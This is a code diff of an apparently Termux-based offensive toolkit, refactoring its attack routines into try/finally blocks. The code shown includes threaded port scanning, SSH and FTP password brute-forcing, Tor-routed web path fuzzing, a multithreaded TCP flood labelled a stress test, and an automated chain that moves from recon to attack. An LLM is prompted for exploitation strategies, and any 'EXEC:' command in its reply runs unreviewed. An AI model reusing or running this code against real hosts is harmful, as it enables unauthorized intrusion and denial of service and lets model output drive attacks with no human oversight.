@@ -190,66 +190,66 @@ class OffensiveSuite:
 
     def scan(self, target):
         self.ui.active_tasks += 1
-        self.ui.add_log(f"Scanning Vectors: {target}", "INFO")
-        open_ports = []
-        def check(p):
-            try:
-                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-                    s.settimeout(0.5)
-                    if s.connect_ex((target, p)) == 0:
-                        try: svc = socket.getservbyport(p)
-                        except: svc = "unknown"
-                        self.ui.add_log(f"Vector Open: {p} ({svc})", "SUCCESS")
-                        self.cortex.trigger_feedback(f"Open vector discovered on {target}: Port {p} ({svc})")
-                        open_ports.append((p, svc))
-                        return p
-            except: pass
-            return None
-        with ThreadPoolExecutor(max_workers=50) as ex:
-            ex.map(check, SlayerConfig.DEFAULT_PORTS)
-        self.ui.active_tasks -= 1
-        return open_ports
+        try:
+            self.ui.add_log(f"Scanning Vectors: {target}", "INFO")
+            open_ports = []
+            def check(p):
+                try:
+                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                        s.settimeout(0.5)
+                        if s.connect_ex((target, p)) == 0:
+                            try: svc = socket.getservbyport(p)
+                            except: svc = "unknown"
+                            self.ui.add_log(f"Vector Open: {p} ({svc})", "SUCCESS")
+                            self.cortex.trigger_feedback(f"Open vector discovered on {target}: Port {p} ({svc})")
+                            open_ports.append((p, svc))
+                            return p
+                except: pass
+                return None
+            with ThreadPoolExecutor(max_workers=50) as ex:
+                ex.map(check, SlayerConfig.DEFAULT_PORTS)
+            return open_ports
+        finally:
+            self.ui.active_tasks -= 1
 
     def brute(self, target, service="ssh"):
         self.ui.active_tasks += 1
         self.brute_active = True
-        self.ui.add_log(f"Initiating LIVE BRUTE on {target}:{service}", "INFO")
-        
-        found = False
-        for user in SlayerConfig.USERS:
-            if not self.brute_active or found: break
-            for pwd in SlayerConfig.PASSWORDS:
+        try:
+            self.ui.add_log(f"Initiating LIVE BRUTE on {target}:{service}", "INFO")
+            found = False
+            for user in SlayerConfig.USERS:
                 if not self.brute_active or found: break
-                self.ui.add_log(f"Testing: {user}:{pwd}", "INFO")
-                
-                if service.lower() == "ssh":
-                    try:
-                        ssh = paramiko.SSHClient()
-                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                        ssh.connect(target, username=user, password=pwd, timeout=3)
-                        self.ui.add_log(f"CRACKED: {user}:{pwd}", "CRITICAL")
-                        self.cortex.trigger_feedback(f"SSH Access Gained on {target} with {user}:{pwd}")
-                        found = True
-                        ssh.close()
-                    except: pass
-                elif service.lower() == "ftp":
-                    try:
-                        ftp = ftplib.FTP(target, timeout=3)
-                        ftp.login(user, pwd)
-                        self.ui.add_log(f"CRACKED: {user}:{pwd}", "CRITICAL")
-                        self.cortex.trigger_feedback(f"FTP Access Gained on {target} with {user}:{pwd}")
-                        found = True
-                        ftp.quit()
-                    except: pass
-                
-        if not self.brute_active:
-            self.ui.add_log("Brute force operation ABORTED.", "WARN")
-        elif not found:
-            self.ui.add_log("Brute completed. No weak credentials found.", "WARN")
-        
-        self.brute_active = False
-        self.ui.active_tasks -= 1
-        return found
+                for pwd in SlayerConfig.PASSWORDS:
+                    if not self.brute_active or found: break
+                    self.ui.add_log(f"Testing: {user}:{pwd}", "INFO")
+                    if service.lower() == "ssh":
+                        try:
+                            ssh = paramiko.SSHClient()
+                            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                            ssh.connect(target, username=user, password=pwd, timeout=3)
+                            self.ui.add_log(f"CRACKED: {user}:{pwd}", "CRITICAL")
+                            self.cortex.trigger_feedback(f"SSH Access Gained on {target} with {user}:{pwd}")
+                            found = True
+                            ssh.close()
+                        except: pass
+                    elif service.lower() == "ftp":
+                        try:
+                            ftp = ftplib.FTP(target, timeout=3)
+                            ftp.login(user, pwd)
+                            self.ui.add_log(f"CRACKED: {user}:{pwd}", "CRITICAL")
+                            self.cortex.trigger_feedback(f"FTP Access Gained on {target} with {user}:{pwd}")
+                            found = True
+                            ftp.quit()
+                        except: pass
+            if not self.brute_active:
+                self.ui.add_log("Brute force operation ABORTED.", "WARN")
+            elif not found:
+                self.ui.add_log("Brute completed. No weak credentials found.", "WARN")
+            return found
+        finally:
+            self.brute_active = False
+            self.ui.active_tasks -= 1
 
     def stop_brute(self):
         if self.brute_active:
@@ -261,27 +261,25 @@ class OffensiveSuite:
     def fuzz(self, url):
         self.ui.active_tasks += 1
         self.fuzz_active = True
-        if not url.startswith("http"): url = "http://" + url
-        self.ui.add_log(f"Fuzzing Web Surface: {url}", "INFO")
-        
-        words = SlayerConfig.FUZZ_LIST
-        
-        def check_path(p):
-            if not self.fuzz_active: return
-            test_url = url.rstrip("/") + "/" + p
-            try:
-                session = self.tor.get_session()
-                r = session.get(test_url, timeout=3, allow_redirects=False)
-                if r.status_code in [200, 301, 302, 403]:
-                    self.ui.add_log(f"Found: /{p} (Status: {r.status_code})", "SUCCESS")
-                    self.cortex.trigger_feedback(f"Web path discovered: {test_url} (Status: {r.status_code})")
-            except: pass
-
-        with ThreadPoolExecutor(max_workers=20) as ex:
-            ex.map(check_path, words)
-        
-        self.fuzz_active = False
-        self.ui.active_tasks -= 1
+        try:
+            if not url.startswith("http"): url = "http://" + url
+            self.ui.add_log(f"Fuzzing Web Surface: {url}", "INFO")
+            words = SlayerConfig.FUZZ_LIST
+            def check_path(p):
+                if not self.fuzz_active: return
+                test_url = url.rstrip("/") + "/" + p
+                try:
+                    session = self.tor.get_session()
+                    r = session.get(test_url, timeout=3, allow_redirects=False)
+                    if r.status_code in [200, 301, 302, 403]:
+                        self.ui.add_log(f"Found: /{p} (Status: {r.status_code})", "SUCCESS")
+                        self.cortex.trigger_feedback(f"Web path discovered: {test_url} (Status: {r.status_code})")
+                except: pass
+            with ThreadPoolExecutor(max_workers=20) as ex:
+                ex.map(check_path, words)
+        finally:
+            self.fuzz_active = False
+            self.ui.active_tasks -= 1
 
     def stop_fuzz(self):
         if self.fuzz_active:
@@ -309,57 +307,50 @@ class OffensiveSuite:
     def auto(self, target):
         self.ui.active_tasks += 1
         self.auto_active = True
-        self.ui.add_log(f"Initiating NEURAL AUTO SEQUENCE on {target}", "CRITICAL")
-        
-        recon_data = {"target": target, "type": "unknown", "details": {}}
-        
-        # 1. Target Identification & Phase 1: Recon
-        if not self.auto_active: return
-        if re.match(r"^(http|https)://", target):
-            recon_data["type"] = "URL"
-            self.ui.add_log(f"Target identified as URL. Initiating Web Surface Analysis...", "INFO")
-            # Extract domain/IP from URL
-            host = target.split("//")[-1].split("/")[0].split(":")[0]
-            recon_data["details"]["web_scan"] = self.web_scan(target)
-            recon_data["details"]["open_ports"] = self.scan(host)
-        elif re.match(r"^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$", target):
-            recon_data["type"] = "Domain"
-            self.ui.add_log(f"Target identified as Domain. Initiating Full Recon...", "INFO")
-            recon_data["details"]["subdomains"] = self.recon(target)
-            recon_data["details"]["open_ports"] = self.scan(target)
-            recon_data["details"]["geo"] = self.geo(socket.gethostbyname(target))
-        else:
-            recon_data["type"] = "IP"
-            self.ui.add_log(f"Target identified as IP. Initiating Vector Scan...", "INFO")
-            recon_data["details"]["open_ports"] = self.scan(target)
-            recon_data["details"]["geo"] = self.geo(target)
-
-        # 2. Neural Strategy Consultation
-        if not self.auto_active: return
-        self.ui.add_log("Phase 2: Consulting Neural Core for Exploitation Strategy...", "AI")
-        strategy = self.cortex.reason(f"Analyze target {target} ({recon_data['type']}) with following data: {recon_data['details']}. Provide the most efficient exploitation path.", recon_data)
-        self.ui.add_log(f"Neural Strategy Received: {strategy[:100]}...", "AI")
-        
-        # 3. Execution based on strategy and defaults
-        open_ports = recon_data["details"].get("open_ports", [])
-        for port, svc in open_ports:
-            if not self.auto_active: break
-            if svc in ["ssh", "ftp", "telnet", "mysql", "postgresql"]:
-                self.ui.add_log(f"Executing Brute Force on {svc} ({port})", "INFO")
-                self.brute(target if recon_data["type"] != "URL" else host, svc)
-            elif port in [80, 443, 8080, 8443]:
-                self.ui.add_log(f"Executing Web Fuzzing on port {port}", "INFO")
-                proto = "https" if port in [443, 8443] else "http"
-                self.fuzz(f"{proto}://{target if recon_data['type'] != 'URL' else host}:{port}")
-        
-        self.ui.add_log("NEURAL AUTO SEQUENCE COMPLETED.", "SUCCESS")
-        self.auto_active = False
-        self.ui.active_tasks -= 1
+        try:
+            self.ui.add_log(f"Initiating NEURAL AUTO SEQUENCE on {target}", "CRITICAL")
+            recon_data = {"target": target, "type": "unknown", "details": {}}
+            if not self.auto_active: return
+            if re.match(r"^(http|https)://", target):
+                recon_data["type"] = "URL"
+                self.ui.add_log(f"Target identified as URL. Initiating Web Surface Analysis...", "INFO")
+                host = target.split("//")[-1].split("/")[0].split(":")[0]
+                recon_data["details"]["web_scan"] = self.web_scan(target)
+                recon_data["details"]["open_ports"] = self.scan(host)
+            elif re.match(r"^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$", target):
+                recon_data["type"] = "Domain"
+                self.ui.add_log(f"Target identified as Domain. Initiating Full Recon...", "INFO")
+                recon_data["details"]["subdomains"] = self.recon(target)
+                recon_data["details"]["open_ports"] = self.scan(target)
+                recon_data["details"]["geo"] = self.geo(socket.gethostbyname(target))
+            else:
+                recon_data["type"] = "IP"
+                self.ui.add_log(f"Target identified as IP. Initiating Vector Scan...", "INFO")
+                recon_data["details"]["open_ports"] = self.scan(target)
+                recon_data["details"]["geo"] = self.geo(target)
+            if not self.auto_active: return
+            self.ui.add_log("Phase 2: Consulting Neural Core for Exploitation Strategy...", "AI")
+            strategy = self.cortex.reason(f"Analyze target {target} ({recon_data['type']}) with following data: {recon_data['details']}. Provide the most efficient exploitation path.", recon_data)
+            self.ui.add_log(f"Neural Strategy Received: {strategy[:100]}...", "AI")
+            open_ports = recon_data["details"].get("open_ports", [])
+            for port, svc in open_ports:
+                if not self.auto_active: break
+                if svc in ["ssh", "ftp", "telnet", "mysql", "postgresql"]:
+                    self.ui.add_log(f"Executing Brute Force on {svc} ({port})", "INFO")
+                    self.brute(target if recon_data["type"] != "URL" else host, svc)
+                elif port in [80, 443, 8080, 8443]:
+                    self.ui.add_log(f"Executing Web Fuzzing on port {port}", "INFO")
+                    proto = "https" if port in [443, 8443] else "http"
+                    self.fuzz(f"{proto}://{target if recon_data['type'] != 'URL' else host}:{port}")
+            self.ui.add_log("NEURAL AUTO SEQUENCE COMPLETED.", "SUCCESS")
+        finally:
+            self.auto_active = False
+            self.ui.active_tasks -= 1
 
     def sniff(self):
         self.ui.active_tasks += 1
-        self.ui.add_log("Scanning Local Network Segments...", "INFO")
         try:
+            self.ui.add_log("Scanning Local Network Segments...", "INFO")
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             s.connect(("8.8.8.8", 80))
             local_ip = s.getsockname()[0]
@@ -374,78 +365,87 @@ class OffensiveSuite:
                 except: pass
             with ThreadPoolExecutor(max_workers=20) as ex: ex.map(ping, range(1, 255))
         except Exception as e: self.ui.add_log(f"SNIFF failed: {e}", "CRITICAL")
-        self.ui.active_tasks -= 1
+        finally:
+            self.ui.active_tasks -= 1
 
     def recon(self, domain):
         self.ui.active_tasks += 1
-        self.ui.add_log(f"Initiating RECON on {domain}", "INFO")
-        subs = ["www", "dev", "api", "db", "mail", "admin", "test", "portal", "vpn"]
-        found = []
-        for s in subs:
-            target = f"{s}.{domain}"
-            try:
-                ip = socket.gethostbyname(target)
-                self.ui.add_log(f"Subdomain Found: {target} ({ip})", "SUCCESS")
-                self.cortex.trigger_feedback(f"New attack surface discovered: {target} ({ip})")
-                found.append((target, ip))
-            except: pass
-        self.ui.active_tasks -= 1
-        return found
+        try:
+            self.ui.add_log(f"Initiating RECON on {domain}", "INFO")
+            subs = ["www", "dev", "api", "db", "mail", "admin", "test", "portal", "vpn"]
+            found = []
+            for s in subs:
+                target = f"{s}.{domain}"
+                try:
+                    ip = socket.gethostbyname(target)
+                    self.ui.add_log(f"Subdomain Found: {target} ({ip})", "SUCCESS")
+                    self.cortex.trigger_feedback(f"New attack surface discovered: {target} ({ip})")
+                    found.append((target, ip))
+                except: pass
+            return found
+        finally:
+            self.ui.active_tasks -= 1
 
     def geo(self, ip):
         self.ui.active_tasks += 1
-        self.ui.add_log(f"Locating Target: {ip}", "INFO")
-        res = {}
         try:
-            resp = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
-            if resp['status'] == 'success':
-                loc = f"{resp['city']}, {resp['regionName']}, {resp['country']}"
-                isp = resp['isp']
-                self.ui.add_log(f"Location: {loc} | ISP: {isp}", "SUCCESS")
-                res = resp
-            else: self.ui.add_log("Geolocation failed for this IP.", "WARN")
-        except: self.ui.add_log("Geo-service unreachable.", "CRITICAL")
-        self.ui.active_tasks -= 1
-        return res
+            self.ui.add_log(f"Locating Target: {ip}", "INFO")
+            res = {}
+            try:
+                resp = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
+                if resp['status'] == 'success':
+                    loc = f"{resp['city']}, {resp['regionName']}, {resp['country']}"
+                    isp = resp['isp']
+                    self.ui.add_log(f"Location: {loc} | ISP: {isp}", "SUCCESS")
+                    res = resp
+                else: self.ui.add_log("Geolocation failed for this IP.", "WARN")
+            except: self.ui.add_log("Geo-service unreachable.", "CRITICAL")
+            return res
+        finally:
+            self.ui.active_tasks -= 1
 
     def dos(self, target, port, duration=30):
         self.ui.active_tasks += 1
-        self.ui.add_log(f"Initiating Stress Test: {target}:{port} for {duration}s", "WARN")
-        timeout = time.time() + duration
-        def flood():
-            while time.time() < timeout:
-                try:
-                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    s.settimeout(1)
-                    s.connect((target, int(port)))
-                    s.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
-                    s.close()
-                except: pass
-        for _ in range(20): threading.Thread(target=flood).start()
-        self.ui.active_tasks -= 1
+        try:
+            self.ui.add_log(f"Initiating Stress Test: {target}:{port} for {duration}s", "WARN")
+            timeout = time.time() + duration
+            def flood():
+                while time.time() < timeout:
+                    try:
+                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        s.settimeout(1)
+                        s.connect((target, int(port)))
+                        s.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
+                        s.close()
+                    except: pass
+            for _ in range(20): threading.Thread(target=flood).start()
+        finally:
+            self.ui.active_tasks -= 1
 
     def web_scan(self, url):
         self.ui.active_tasks += 1
-        if not url.startswith("http"): url = "http://" + url
-        self.ui.add_log(f"Analyzing Web Surface: {url}", "INFO")
-        res = {"headers": {}, "paths": []}
         try:
-            session = self.tor.get_session()
-            r = session.get(url, timeout=5)
-            res["headers"] = dict(r.headers)
-            self.ui.add_log(f"Server: {res['headers'].get('Server', 'Unknown')}", "SUCCESS")
-            
-            paths = ["/admin", "/config.php", "/.env", "/.git", "/wp-admin", "/robots.txt"]
-            for p in paths:
-                test_url = url.rstrip("/") + p
-                tr = session.get(test_url, timeout=3)
-                if tr.status_code == 200:
-                    self.ui.add_log(f"Sensitive Path Found: {p}", "WARN")
-                    self.cortex.trigger_feedback(f"Web vulnerability: Exposed path {p} on {url}")
-                    res["paths"].append(p)
-        except Exception as e: self.ui.add_log(f"Web Scan Error: {e}", "CRITICAL")
-        self.ui.active_tasks -= 1
-        return res
+            if not url.startswith("http"): url = "http://" + url
+            self.ui.add_log(f"Analyzing Web Surface: {url}", "INFO")
+            res = {"headers": {}, "paths": []}
+            try:
+                session = self.tor.get_session()
+                r = session.get(url, timeout=5)
+                res["headers"] = dict(r.headers)
+                self.ui.add_log(f"Server: {res['headers'].get('Server', 'Unknown')}", "SUCCESS")
+                
+                paths = ["/admin", "/config.php", "/.env", "/.git", "/wp-admin", "/robots.txt"]
+                for p in paths:
+                    test_url = url.rstrip("/") + p
+                    tr = session.get(test_url, timeout=3)
+                    if tr.status_code == 200:
+                        self.ui.add_log(f"Sensitive Path Found: {p}", "WARN")
+                        self.cortex.trigger_feedback(f"Web vulnerability: Exposed path {p} on {url}")
+                        res["paths"].append(p)
+            except Exception as e: self.ui.add_log(f"Web Scan Error: {e}", "CRITICAL")
+            return res
+        finally:
+            self.ui.active_tasks -= 1
 
     def hash_id(self, hash_str):
         h_len = len(hash_str)
@@ -498,7 +498,6 @@ class NeuralCortex:
         self.status = "THINKING"
         try:
             url = SlayerConfig.API_ENDPOINT
-            
             cmd_knowledge = "\n".join([f"- {k}: {v}" for k, v in SlayerConfig.COMMAND_LIST.items()])
             system_msg = (
                 "You are now SLAYER-TACTICAL-ADVISOR-v1, a highly sophisticated cybersecurity analyst and penetration testing expert. "
@@ -512,53 +511,42 @@ class NeuralCortex:
                 f"AVAILABLE COMMANDS:\n{cmd_knowledge}\n"
                 f"CURRENT TARGET CONTEXT: {state}"
             )
-            
-            # Primary Attempt
             headers = {"Authorization": f"Bearer {SlayerConfig.PRIMARY_KEY.strip()}", "Content-Type": "application/json"}
             data = {"model": SlayerConfig.PRIMARY_MODEL, "messages": [{"role": "system", "content": system_msg}, {"role": "user", "content": prompt}], "max_tokens": 1024}
             resp = requests.post(url, headers=headers, json=data, timeout=15)
-            
             if resp.status_code != 200:
                 if SlayerConfig.FALLBACK_KEY:
                     self.ui.add_log(f"Primary failed ({resp.status_code}). Engaging Fallback Key...", "WARN")
                     headers["Authorization"] = f"Bearer {SlayerConfig.FALLBACK_KEY.strip()}"
                     data["model"] = SlayerConfig.FALLBACK_MODEL
                     resp = requests.post(url, headers=headers, json=data, timeout=15)
-                
                 if resp.status_code != 200:
                     error_data = resp.json().get("error", {})
                     error_msg = error_data.get("message", "Unknown API Error")
                     error_code = error_data.get("code", "N/A")
                     self.ui.add_log(f"Neural Core Error: {error_msg} (Code: {error_code})", "CRITICAL")
                     self.status = "ERROR"
-                    self.ui.active_tasks -= 1
                     return f"Error: {error_msg}"
-
             res_json = resp.json()
             if "choices" not in res_json:
                 self.ui.add_log(f"Neural Core Error: Invalid response format", "CRITICAL")
                 self.status = "ERROR"
-                self.ui.active_tasks -= 1
                 return "Error: Invalid response format"
-
             res = res_json["choices"][0]["message"]["content"].strip()
-            
-            # Autonomous Execution Logic
             if "EXEC:" in res:
                 cmd_to_exec = res.split("EXEC:")[1].split("\n")[0].strip()
                 self.ui.add_log(f"AI executing: {cmd_to_exec}", "AI")
                 self.ui.process_command(cmd_to_exec)
-
             self.history.append((prompt, res))
             self.status = "LINKED"
-            self.ui.active_tasks -= 1
-            self.ui.render() # Force UI update to show AI response in Neural Link
+            self.ui.render()
             return res
         except Exception as e:
             self.status = "ERROR"
             self.ui.add_log(f"Neural Error: {e}", "CRITICAL")
-            self.ui.active_tasks -= 1
             return f"Error: {e}"
+        finally:
+            self.ui.active_tasks -= 1
 
 class TermuxSlayerApp:
     def __init__(self):
@@ -633,15 +621,16 @@ class TermuxSlayerApp:
         cols, rows = shutil.get_terminal_size()
         ui_height = rows - 1
         # Use a more efficient clear and update
-        sys.stdout.write("\033[H") # Move cursor to top instead of clearing everything
+        sys.stdout.write("\033[?25l") # Hide cursor
+        sys.stdout.write("\033[H") # Move cursor to top
         self.setup_layout()
         self.layout["status"].update(self.get_status())
         self.layout["body"].update(self.get_body())
         self.layout["neural"].update(self.get_neural())
         self.layout["footer"].update(Panel(f"[bold green]Slayer-Input > [/][bold white]{self.current_cmd}[/]", border_style="blue"))
         console.print(self.layout, height=ui_height)
-        # Move cursor to the end of the input line
         sys.stdout.write("\033[K") # Clear to end of line
+        sys.stdout.write("\033[?25h") # Show cursor
         sys.stdout.flush()
 
     def process_command(self, cmd_input):
@@ -845,21 +834,20 @@ class TermuxSlayerApp:
         old_settings = termios.tcgetattr(fd)
         try:
             tty.setcbreak(fd) # Use cbreak instead of raw for better stability
+            sys.stdout.write("\033[?25l") # Hide cursor initially
+            sys.stdout.flush()
             while True:
                 self.render()
                 rlist, _, _ = select.select([sys.stdin], [], [], 0.05)
                 if rlist:
                     char = sys.stdin.read(1)
                     if ord(char) == 27: # ESC key
-                        # Check for multi-byte escape sequences (like arrows)
-                        # We need a longer timeout for Termux latency
                         rlist_esc, _, _ = select.select([sys.stdin], [], [], 0.05)
                         if not rlist_esc:
                             self.offensive.stop_all()
                             self.add_log("GLOBAL KILL-SWITCH TRIGGERED", "CRITICAL")
                             self.current_cmd = ""
                         else:
-                            # Read and discard the rest of the sequence (like arrows)
                             sys.stdin.read(2)
                     elif char in ['\r', '\n']:
                         cmd = self.current_cmd.strip()
@@ -874,8 +862,9 @@ class TermuxSlayerApp:
         except KeyboardInterrupt:
             pass
         except Exception as e:
-            # Fallback to standard input if tty fails
             termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
+            sys.stdout.write("\033[?25h") # Ensure cursor is back
+            sys.stdout.flush()
             while True:
                 try:
                     cmd = input("Slayer-Input > ").strip()
@@ -884,6 +873,7 @@ class TermuxSlayerApp:
                 except (KeyboardInterrupt, EOFError): break
         finally:
             termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
+            sys.stdout.write("\033[?25h") # Show cursor
             sys.stdout.write("\033[H\033[2J\033[3J")
             sys.stdout.flush()
 
